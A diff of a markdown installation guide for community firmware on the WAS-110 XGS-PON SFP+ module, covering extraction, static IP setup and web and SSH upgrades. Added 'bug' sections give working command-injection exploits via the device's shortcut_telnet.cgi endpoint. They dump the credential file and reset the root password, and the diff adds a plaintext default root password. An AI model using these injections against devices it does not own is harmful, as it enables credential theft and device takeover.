@@ -12,12 +12,9 @@ categories:
 <!-- more -->
 <!-- nocont -->
 
-!!! note "Password changes"
-    As of firmware version __1.0.21__, the WAS-110 web UI and SSH default passwords have changed.
-
-Out of the box, the WAS-110 isn't fully compatible with varying ISP OLT configurations; with issues ranging from 
-vendor specific managed entities to VEIP to IEEE standards such as [802.1X] and [802.1ad]. Due to these 
-incompabilities and discovered bugs, a community firmware[^1] was curated to fix any impeding issues[^2]. 
+Out of the box, the WAS-110 is not fully compatible with varying ISP OLT configurations, with issues ranging from 
+vendor-specific managed entities to VEIP to IEEE standards such as [802.1X] and [802.1ad]. Due to these 
+incompatibilities and discovered bugs, a community firmware[^1] has been curated to fix any impeding issues[^2]. 
 
   [802.1X]: https://en.wikipedia.org/wiki/IEEE_802.1X
   [802.1ad]: https://en.wikipedia.org/wiki/IEEE_802.1ad
@@ -27,6 +24,10 @@ incompabilities and discovered bugs, a community firmware[^1] was curated to fix
 Plug the WAS-110 into a 10-gigabit compatible SFP+ host interface, such as a NIC, media converter, and/or network
 switch.
 
+!!! note "Rx loss"
+    The WAS-110 running the default Azores firmware will trigger RX_LOS if the SC/APC fiber cable is unplugged or 
+    inactive. Some host interfaces will enter a power-saving state, making the WAS-110 inaccessible.
+
 ### Download firmware
 
 The community firmware comes in two (2) variants: *basic* and *bfw*; for the purposes of this guide, we'll focus on
@@ -34,11 +35,12 @@ the recommended <ins>basic</ins> firmware, which can be downloaded at:
 
 <https://github.com/djGrrr/8311-was-110-firmware-builder/releases/latest>
 
-The <ins>basic</ins> firmware consists of a vanilla MaxLinear [OpenWrt] 19.07 fork,
-with the addition of the aformentioned fixes and customised luci web interfaces to ease masquerading. It also does 
-without the abysmal BFW additions and abstractions, as well as the backdoors.
+The *basic* firmware is based on a vanilla MaxLinear [OpenWrt] 19.07 build from [Potrontec]. Additionally, it 
+includes customized luci web interfaces for hassle-free masquerading and the aforementioned fixes. And unlike the *bfw* 
+variant, it does not include the abysmal BFW patches and cruft.
 
   [OpenWrt]: https://openwrt.org/
+  [Potrontec]: https://www.potrontec.com/
 
 ### Extract download
 
@@ -48,34 +50,37 @@ The firmware files are archived by [7-Zip] and can be extracted with:
 
 === ":fontawesome-brands-windows: Windows"
 
-    ``` doscon
-    > 7z x WAS-110_8311_firmware_mod_<version>_basic.7z
+    ``` sh
+    7z x WAS-110_8311_firmware_mod_<version>_basic.7z
     ```
 
 === ":material-apple: macOS"
 
     !!! note "The following commands assume [Homebrew](https://brew.sh) is installed"
 
-    ``` console
-    $ brew install sevenzip
-    $ 7zz x WAS-110_8311_firmware_mod_<version>_basic.7z
+    ``` sh
+    brew install sevenzip
+    7zz x WAS-110_8311_firmware_mod_<version>_basic.7z
     ```
 
 === ":material-linux: Linux"
 
     !!! note "The following commands assume a Debian-based distribution"
 
-    ``` console
-    $ sudo apt-get install 7zip-full
-    $ 7z x WAS-110_8311_firmware_mod_<version>_basic.7z #(1)!
+    ``` sh
+    sudo apt-get install 7zip-full
+    7z x WAS-110_8311_firmware_mod_<version>_basic.7z #(1)!
     ```
 
     1. Replace `<version>` with the downloaded version.
 
 ### Set a static IP
 
-The default IP of the WAS-110 listens at `192.168.11.1`; a static IP on the same `192.168.11.0/24` subnet must be
-assigned to the host interface.
+The default IP address of the WAS-110 is `192.168.11.1`. To connect successfully, a static IP address must be assigned
+to the host interface on the same `192.168.11.0/24` subnet[^3]. (1)
+{ .annotate }
+
+1.  E.g. `192.168.11.2` which is the default ping IP address.
 
 === ":fontawesome-brands-windows: Windows"
 
@@ -85,45 +90,79 @@ assigned to the host interface.
         2. In the Run dialog box, type `cmd` into the input field and then press
            <kbd>Ctrl</kbd> + <kbd>Shift</kbd> + <kbd>Enter</kbd>. 
 
-    ``` doscon hl_lines="2"
-    > netsh interface ip show config
-    > netsh interface ipv4 set address name="<interface name>" static 192.168.11.2 255.255.255.0 192.168.11.1
+    ``` sh hl_lines="2"
+    netsh interface ip show config
+    netsh interface ipv4 set address name="<interface name>" static 192.168.11.2 255.255.255.0 192.168.11.1
+    netsh interface ipv4 set interface "<interface name>" mtu=1500
     ```
+
+    ??? info "For the shameless mouse clickers..."
+        If you are more comfortable with the Windows GUI, follow the <ins>manual</ins> steps outlined by Microsoft at:
+
+        <https://support.microsoft.com/en-us/windows/change-tcp-ip-settings-bd0a07af-15f5-cd6a-363f-ca2b6f391ace>
 
 === ":material-apple: macOS"
 
-    ``` console hl_lines="2"
-    $ sudo networksetup -listallnetworkservices
-    $ sudo networksetup -setmanual <service> 192.168.11.2 255.255.255.0 192.168.11.1
+    ``` sh hl_lines="2"
+    sudo networksetup -listallnetworkservices
+    sudo networksetup -setmanual <service> 192.168.11.2 255.255.255.0 192.168.11.1
     ```
 
 === ":material-linux: Linux"
 
     !!! note "The following commands must be run as root `su -` or prepended with `sudo`"
 
-    ``` console hl_lines="6"
-    $ ip link show
-    $ ethtool <interface>
-    $ ip address show
-    $ ip address flush dev <interface>
-    $ ip route flush dev <interface>
-    $ ip address add 192.168.11.2/24 dev <interface>
-    $ ip address show dev <interface>
+    ``` sh hl_lines="6"
+    ip link show
+    ethtool <interface>
+    ip address show
+    ip address flush dev <interface>
+    ip route flush dev <interface>
+    ip address add 192.168.11.2/24 dev <interface>
+    ip address show dev <interface>
     ```
 
 ## Web UI upgrade <small>recommended</small> { #web-ui-upgrade data-toc-label="Web UI upgrade" }
 
 ### Web credentials
 
-The default web credentials can be found in `/ptconf/param_ct.xml` and modifications from the web UI are stored in
-`/ptconf/usrconfig_conf` as base64 encoded strings.
+The default web credentials can be found in `/ptrom/ptconf/param_ct.xml`. Modifications from the web UI are stored in
+`/ptrom/ptconf/usrconfig_conf` as base64 encoded strings.
 
 !!! warning
     Passwords have a maximum length of 16 characters which are not restricted by the web UI.
 
 ??? bug "Exploit to disclose the default web credentials"
     
-    Navigate to <http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?cat%20%2Fptrom%2Fptconf%2Fparam_ct.xml>
+    To dump the web credentials from `/ptrom/ptconf/param_ct.xml`, navigate to:
+
+    <http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?cat%20%2Fptrom%2Fptconf%2Fparam_ct.xml>
+
+    Alternatively, run the following command to download `param_ct.xml` to a temporary directory.
+
+    === ":fontawesome-brands-windows: Windows"
+
+        ``` sh
+        dir %Temp% && curl -O "http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?cat%20%2Fptrom%2Fptconf%2Fparam_ct.xml"
+        ```
+
+    === ":material-apple: macOS"
+
+        !!! note "The following commands assume [Homebrew](https://brew.sh) is installed"
+
+        ``` sh
+        brew install curl
+        cd /tmp && curl -O "http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?cat%20%2Fptrom%2Fptconf%2Fparam_ct.xml"
+        ```
+
+    === ":material-linux: Linux"
+
+        !!! note "The following commands assume a Debian-based distribution, such as [Ubuntu](https://ubuntu.com/)"
+
+        ``` sh
+        sudo apt-get install curl
+        cd /tmp && curl -O "http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?cat%20%2Fptrom%2Fptconf%2Fparam_ct.xml"
+        ```
 
 === "&lt;= v1.0.20"
 
@@ -142,8 +181,10 @@ The default web credentials can be found in `/ptconf/param_ct.xml` and modificat
 ### Firmware upgrade
 
 !!! danger "Proceed with caution!"
-    The WAS-110 firmware upgrade utility on occasion has been known to soft-brick itself; a host device with serial
-    breakout on SFP pins 2 (rx) and 7 (tx) will be required to recover.
+    The WAS-110 firmware upgrade utility on occasion has been known to soft-brick itself. To recover, a host device 
+    with serial breakout on SFP pins 2 (rx) and 7 (tx) will be required.
+
+    Alternatively, jump past to the <ins>safer</ins> [shell upgrade](#shell-upgrade) method later in this guide.
 
 ![WAS-110 login](install-8311-community-firmware-on-the-bfw-solutions-was-110/was_110_login.webp)
 
@@ -164,18 +205,18 @@ Patiently wait out the process, 4 to 5 minutes, or until the web session becomes
 
     === ":fontawesome-brands-windows: Windows"
 
-        ``` doscon
-        > ping -t 192.168.11.1
+        ``` sh
+        ping -t 192.168.11.1
         ```
 
     === ":material-apple: macOS / :material-linux: Linux"
 
-        ``` console
-        $ ping 192.168.11.1
+        ``` sh
+        ping 192.168.11.1
         ```
 
-Once rebooted, begin to enjoy the fruits of the 8311 community, it's not at all possible without each and everyone of
-us.
+Once rebooted, begin to enjoy the fruits of the 8311 community. It is not at all possible without the help and support
+of every one of us.
 
 ## Shell upgrade <small>safer</small> { #shell-upgrade data-toc-label="Shell upgrade" }
 
@@ -189,22 +230,38 @@ us.
 
 === "v1.0.21"
 
-    !!! warning "The root password is not known at this time"
+    | Username | Password       |
+    | -------- | -------------- |
+    | root     | M533%27#32n682 |
 
-    ???+ bug "Exploit to temporarily change the root password"
-        Temporarily change the root password to `root`.
 
-        === ":fontawesome-brands-windows: Windows"
+??? bug "Exploit to temporarily change the root password"
+    Run the following command to temporarily change the root password to `root`.
 
-            ``` doscon
-            > curl -s -o null "http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?%7B%20echo%20root%20%3B%20sleep%201%3B%20echo%20root%3B%20%7D%20%7C%20passwd%20root"
-            ```
+    === ":fontawesome-brands-windows: Windows"
 
-        === ":material-apple: macOS / :material-linux: Linux"
+        ``` sh
+        curl -s -o null "http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?%7B%20echo%20root%20%3B%20sleep%201%3B%20echo%20root%3B%20%7D%20%7C%20passwd%20root"
+        ```
 
-            ``` console
-            $ curl -s -o /dev/null "http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?%7B%20echo%20root%20%3B%20sleep%201%3B%20echo%20root%3B%20%7D%20%7C%20passwd%20root"
-            ```
+    === ":material-apple: macOS"
+
+        !!! note "The following commands assume [Homebrew](https://brew.sh) is installed"
+
+        ``` sh
+        brew install curl
+        curl -s -o /dev/null "http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?%7B%20echo%20root%20%3B%20sleep%201%3B%20echo%20root%3B%20%7D%20%7C%20passwd%20root"
+        ```
+
+    === ":material-linux: Linux"
+
+        !!! note "The following commands assume a Debian-based distribution, such as [Ubuntu](https://ubuntu.com/)"
+
+        ``` sh
+        sudo apt-get install curl
+        curl -s -o /dev/null "http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?%7B%20echo%20root%20%3B%20sleep%201%3B%20echo%20root%3B%20%7D%20%7C%20passwd%20root"
+        ```
+
 ### Local upgrade
 
 The extracted `local-upgrade.tar` includes a <ins>safer</ins> upgrade script in comparison to the built-in web UI.
@@ -217,7 +274,7 @@ SSH must be enabled from the web UI prior to running the shell commands.
 
 1. Within a web browser, navigate to 
    <https://192.168.11.1/html/main.html#service/servicecontrol>
-   and, if asked, input the admin credentials. 
+   and, if asked, input the <em>admin</em> credentials. 
 
 ![WAS-110 services](install-8311-community-firmware-on-the-bfw-solutions-was-110/was_110_services.webp)
 
@@ -227,15 +284,25 @@ SSH must be enabled from the web UI prior to running the shell commands.
 
 Run the following commands from the host terminal to upgrade to the 8311 community firmware.
 
-```
-scp -O -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa local-upgrade.tar root@192.168.11.1:/tmp/
-ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa root@192.168.11.1 'tar xvf /tmp/local-upgrade.tar -C /tmp/ -- upgrade.sh && /tmp/upgrade.sh /tmp/local-upgrade.tar'
-```
+=== ":fontawesome-brands-windows: Windows"
 
-Once rebooted, begin to enjoy the fruits of the 8311 community, it's not at all possible without each and everyone of
-us.
+    ``` sh
+    scp -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa local-upgrade.tar root@192.168.11.1:/tmp/
+    ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa root@192.168.11.1 "tar xvf /tmp/local-upgrade.tar -C /tmp/ -- upgrade.sh && /tmp/upgrade.sh /tmp/local-upgrade.tar"
+    ```
+
+=== ":material-apple: macOS / :material-linux: Linux"
+
+    ``` sh
+    scp -O -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa local-upgrade.tar root@192.168.11.1:/tmp/
+    ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa root@192.168.11.1 'tar xvf /tmp/local-upgrade.tar -C /tmp/ -- upgrade.sh && /tmp/upgrade.sh /tmp/local-upgrade.tar'
+    ```
+
+Once rebooted, begin to enjoy the fruits of the 8311 community. It is not at all possible without the help and support
+of every one of us.
 
 [^1]: <https://github.com/djGrrr/8311-was-110-firmware-builder>
 [^2]: <https://github.com/djGrrr/8311-xgspon-bypass>
 
       <https://github.com/djGrrr/8311-was-110-firmware-builder/blob/master/mods/>
+[^3]: <https://en.wikipedia.org/wiki/Internet_Protocol_version_4#First_and_last_subnet_addresses>
